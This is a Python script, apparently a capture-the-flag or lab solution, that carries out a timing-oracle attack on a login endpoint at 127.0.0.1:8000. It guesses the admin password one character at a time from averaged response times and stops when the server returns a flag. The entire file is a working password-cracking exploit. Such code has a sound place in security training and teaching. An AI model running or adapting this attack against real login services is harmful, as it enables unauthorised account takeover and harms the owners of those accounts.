"""
Timing oracle attack against the vulnerable login endpoint.

The server sleeps for each correct leading character, so the response
time for a guess with k correct characters is noticeably longer than
one with k-1 correct characters. We exploit this one character at a time.
"""

import string
import time
import requests

URL      = "http://127.0.0.1:8000/login/"
USERNAME = "admin"
SAMPLES  = 5         # measurements per candidate — increase if signal is noisy
CHARSET  = string.ascii_lowercase + string.digits


def measure(password: str) -> float:
    """Return the average response time (seconds) for a login attempt."""
    total = 0.0
    for _ in range(SAMPLES):
        start = time.perf_counter()
        requests.post(URL, data={"username": USERNAME, "password": password})
        total += time.perf_counter() - start
    return total / SAMPLES


def crack() -> str:
    known = ""

    while True:
        best_char  = None
        best_time  = 0.0

        for ch in CHARSET:
            guess = known + ch
            t = measure(guess)
            print(f"  {guess!r:<20} {t*1000:.1f} ms")
            if t > best_time:
                best_time = t
                best_char = ch

        known += best_char
        print(f"\n[+] prefix so far: {known!r}\n")

        # Confirm: if this prefix succeeds as the full password we are done.
        resp = requests.post(URL, data={"username": USERNAME, "password": known})
        if "Flag" in resp.text:
            print(f"[*] Password cracked: {known!r}")
            print(resp.text)
            return known


if __name__ == "__main__":
    crack()
